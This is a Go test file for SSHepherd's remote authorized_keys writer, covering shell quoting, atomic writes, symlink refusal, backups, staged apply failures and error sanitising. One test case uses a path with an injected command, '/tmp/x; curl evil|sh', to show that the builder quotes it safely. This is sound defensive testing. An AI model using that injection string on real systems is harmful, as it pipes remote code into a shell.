package sshwrite

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
)

func TestPrecheckCmdFor(t *testing.T) {
	const tail = `; if [ -L "$p" ]; then exit 45; fi; if [ -e "$p" ]; then cp -p "$p" "$p".sshepherd.bak; fi`
	tests := []struct{ name, path, want string }{
		{"default", "~/.ssh/authorized_keys", `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
		{"absolute", "/etc/keys/deploy", `p='/etc/keys/deploy'` + tail},
		{"hostile quote", "/etc/o'brien/keys", `p='/etc/o'\''brien/keys'` + tail},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := precheckCmdFor(tt.path); got != tt.want {
				t.Errorf("precheckCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
			}
		})
	}
}

func TestWriteCmdFor(t *testing.T) {
	// The exact script from the apply spec's remote write protocol.
	const tail = `; umask 077; d=$(dirname "$p"); mkdir -p "$d"; t="$p".sshepherd.tmp; rm -f "$t"; (set -C; cat > "$t") && mv "$t" "$p" || { rm -f "$t"; exit 1; }`
	tests := []struct{ name, path, want string }{
		{"default", "~/.ssh/authorized_keys", `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
		{"home-relative override", "~/managed/keys", `p="${HOME:?}"/'managed/keys'` + tail},
		{"absolute with injection attempt", "/tmp/x; curl evil|sh", `p='/tmp/x; curl evil|sh'` + tail},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := writeCmdFor(tt.path); got != tt.want {
				t.Errorf("writeCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
			}
		})
	}
}

// runSh executes a builder's script through a real sh with HOME pinned to a
// sandbox dir, feeding stdin, and returns the exit code — the same
// through-a-real-shell discipline as sshconn's TestDefaultCmdBehavesLikeOldConst.
func runSh(t *testing.T, script, home string, stdin []byte) int {
	t.Helper()
	c := exec.CommandContext(t.Context(), "sh", "-c", script)
	c.Env = append(os.Environ(), "HOME="+home)
	if stdin != nil {
		c.Stdin = bytes.NewReader(stdin)
	}
	var stderr bytes.Buffer
	c.Stderr = &stderr
	err := c.Run()
	if err == nil {
		return 0
	}
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode()
	}
	t.Fatalf("sh -c %q: %v (stderr %q)", script, err, stderr.String())
	return -1
}

func TestWriteCmdThroughRealSh(t *testing.T) {
	content := []byte("# Managed by SSHepherd. Manual edits will be overwritten by 'sshepherd apply'.\nkey-line\n")

	t.Run("creates file and parent dir with owner-only modes", func(t *testing.T) {
		home := t.TempDir()
		if code := runSh(t, writeCmdFor("~/newdir/auth"), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		got, err := os.ReadFile(filepath.Join(home, "newdir", "auth"))
		if err != nil || !bytes.Equal(got, content) {
			t.Fatalf("file = (%q, %v), want the stdin content", got, err)
		}
		if fi, _ := os.Stat(filepath.Join(home, "newdir", "auth")); fi.Mode().Perm() != 0o600 {
			t.Errorf("file mode = %o, want 600 (umask 077 before any byte lands)", fi.Mode().Perm())
		}
		if fi, _ := os.Stat(filepath.Join(home, "newdir")); fi.Mode().Perm() != 0o700 {
			t.Errorf("dir mode = %o, want 700", fi.Mode().Perm())
		}
	})

	t.Run("overwrites atomically and leaves no temp residue", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if err := os.WriteFile(target, []byte("old\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, writeCmdFor(target), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		got, _ := os.ReadFile(target)
		if !bytes.Equal(got, content) {
			t.Errorf("file = %q, want new content", got)
		}
		entries, _ := os.ReadDir(home)
		for _, e := range entries {
			if strings.Contains(e.Name(), ".sshepherd.tmp") {
				t.Errorf("temp residue left behind: %s", e.Name())
			}
		}
	})

	t.Run("hostile path with single quote", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "o'brien keys")
		if code := runSh(t, writeCmdFor(target), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		if got, err := os.ReadFile(target); err != nil || !bytes.Equal(got, content) {
			t.Fatalf("file = (%q, %v), want content at the literal path", got, err)
		}
	})
}

func TestPrecheckCmdThroughRealSh(t *testing.T) {
	t.Run("symlinked target exits 45 and takes no backup", func(t *testing.T) {
		home := t.TempDir()
		realTarget := filepath.Join(home, "real")
		link := filepath.Join(home, "auth")
		if err := os.WriteFile(realTarget, []byte("k\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(realTarget, link); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(link), home, nil); code != 45 {
			t.Fatalf("exit = %d, want the 45 symlink sentinel", code)
		}
		if fi, err := os.Lstat(link); err != nil || fi.Mode()&os.ModeSymlink == 0 {
			t.Error("symlink was disturbed by the pre-check")
		}
		if _, err := os.Stat(link + ".sshepherd.bak"); !errors.Is(err, os.ErrNotExist) {
			t.Error("refused pre-check must not create a backup")
		}
	})

	t.Run("existing file is backed up, single generation", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if err := os.WriteFile(target, []byte("v1\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		if got, _ := os.ReadFile(target + ".sshepherd.bak"); string(got) != "v1\n" {
			t.Errorf("backup = %q, want v1", got)
		}
		// Second run overwrites the single generation.
		if err := os.WriteFile(target, []byte("v2\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("second exit = %d, want 0", code)
		}
		if got, _ := os.ReadFile(target + ".sshepherd.bak"); string(got) != "v2\n" {
			t.Errorf("backup after rerun = %q, want v2 (single generation, overwritten)", got)
		}
	})

	t.Run("absent file exits 0 with no backup", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		if _, err := os.Stat(target + ".sshepherd.bak"); !errors.Is(err, os.ErrNotExist) {
			t.Error("absent target must not create a backup")
		}
	})
}

// scriptedExec fakes sshconn.Exec: it records each command and returns the
// scripted response for the call ordinal.
type scriptedExec struct {
	cmds      []string
	responses []execResp
}

type execResp struct {
	code   int
	stdout string
	stderr string
	err    error
}

func (s *scriptedExec) exec(_ *ssh.Client, cmd string, stdin io.Reader) (int, *sshconn.CappedBuffer, *sshconn.CappedBuffer, error) {
	i := len(s.cmds)
	s.cmds = append(s.cmds, cmd)
	if stdin != nil {
		// Drain like a real session would; content correctness is asserted
		// via the verify stage's scripted stdout.
		_, _ = io.Copy(io.Discard, stdin)
	}
	r := execResp{}
	if i < len(s.responses) {
		r = s.responses[i]
	}
	if r.err != nil {
		return 0, nil, nil, r.err
	}
	out := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = out.Write([]byte(r.stdout))
	errBuf := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = errBuf.Write([]byte(r.stderr))
	return r.code, out, errBuf, nil
}

// seamedWriter builds a FleetWriter whose network is fully scripted.
func seamedWriter(s *scriptedExec) *FleetWriter {
	return &FleetWriter{
		connect: func(context.Context, config.Server) (*sshconn.Conn, error) {
			return &sshconn.Conn{}, nil // Close is nil-safe by design
		},
		exec: s.exec,
	}
}

func TestApplyProtocolHappyPath(t *testing.T) {
	content := []byte("rendered\n")
	s := &scriptedExec{responses: []execResp{
		{code: 0},                          // pre-check + backup
		{code: 0},                          // write
		{code: 0, stdout: string(content)}, // verify read-back
	}}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u"}
	if err := seamedWriter(s).Apply(context.Background(), srv, content); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if len(s.cmds) != 3 {
		t.Fatalf("ran %d commands, want 3 (pre-check, write, verify)", len(s.cmds))
	}
	if s.cmds[0] != precheckCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[0] = %q, want the default-path pre-check", s.cmds[0])
	}
	if s.cmds[1] != writeCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[1] = %q, want the default-path write", s.cmds[1])
	}
	if s.cmds[2] != sshconn.AuthorizedKeysCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[2] = %q, want the existing read command as verify", s.cmds[2])
	}
}

func TestApplyHonorsAuthorizedKeysFileOverride(t *testing.T) {
	content := []byte("x\n")
	s := &scriptedExec{responses: []execResp{
		{code: 0}, {code: 0}, {code: 0, stdout: "x\n"},
	}}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u", AuthorizedKeysFile: "/etc/keys/u"}
	if err := seamedWriter(s).Apply(context.Background(), srv, content); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	for i, want := range []string{
		precheckCmdFor("/etc/keys/u"), writeCmdFor("/etc/keys/u"), sshconn.AuthorizedKeysCmdFor("/etc/keys/u"),
	} {
		if s.cmds[i] != want {
			t.Errorf("cmd[%d] = %q, want override path command %q", i, s.cmds[i], want)
		}
	}
}

func TestApplySymlinkSentinelRefuses(t *testing.T) {
	s := &scriptedExec{responses: []execResp{{code: 45}}}
	err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
	var symErr *SymlinkError
	if !errors.As(err, &symErr) {
		t.Fatalf("err = %v, want *SymlinkError", err)
	}
	if symErr.Path != "~/.ssh/authorized_keys" {
		t.Errorf("SymlinkError.Path = %q, want the target path named", symErr.Path)
	}
	if len(s.cmds) != 1 {
		t.Fatalf("ran %d commands after refusal, want 1 (never write past a refused pre-check)", len(s.cmds))
	}
}

func TestApplyStageFailures(t *testing.T) {
	tests := []struct {
		name      string
		responses []execResp
		wantIn    string
		wantCmds  int
	}{
		{"pre-check nonzero", []execResp{{code: 1, stderr: "cp: denied"}}, "pre-check", 1},
		{"write nonzero", []execResp{{code: 0}, {code: 1, stderr: "mv: read-only"}}, "write", 2},
		{"verify transport error", []execResp{{code: 0}, {code: 0}, {err: errors.New("channel gone")}}, "verify", 3},
		{"verify absent after write", []execResp{{code: 0}, {code: 0}, {code: 44}}, "absent after write", 3},
		{"verify bytes differ", []execResp{{code: 0}, {code: 0}, {code: 0, stdout: "tampered\n"}}, "differ", 3},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &scriptedExec{responses: tt.responses}
			err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("rendered\n"))
			if err == nil || !strings.Contains(err.Error(), tt.wantIn) {
				t.Fatalf("err = %v, want it to mention %q", err, tt.wantIn)
			}
			if len(s.cmds) != tt.wantCmds {
				t.Errorf("ran %d commands, want %d (later stages must not run after a failure)", len(s.cmds), tt.wantCmds)
			}
		})
	}
}

func TestApplyErrorsAreSanitized(t *testing.T) {
	t.Run("connect error", func(t *testing.T) {
		s := &scriptedExec{}
		w := seamedWriter(s)
		w.connect = func(context.Context, config.Server) (*sshconn.Conn, error) {
			return nil, errors.New("boom\x1b[31m")
		}
		err := w.Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
		if err == nil || !strings.Contains(err.Error(), "boom") {
			t.Fatalf("err = %v, want the connect failure surfaced", err)
		}
		if strings.Contains(err.Error(), "\x1b") {
			t.Errorf("err %q leaks control bytes; must pass the sanitized-error path", err)
		}
	})
	t.Run("remote stderr embedded sanitized", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 1, stderr: "denied\x1b[31m\x07"}}}
		err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
		if err == nil || !strings.Contains(err.Error(), "denied") {
			t.Fatalf("err = %v, want remote stderr embedded", err)
		}
		if strings.ContainsAny(err.Error(), "\x1b\x07") {
			t.Errorf("err %q must not contain control bytes", err)
		}
	})
}
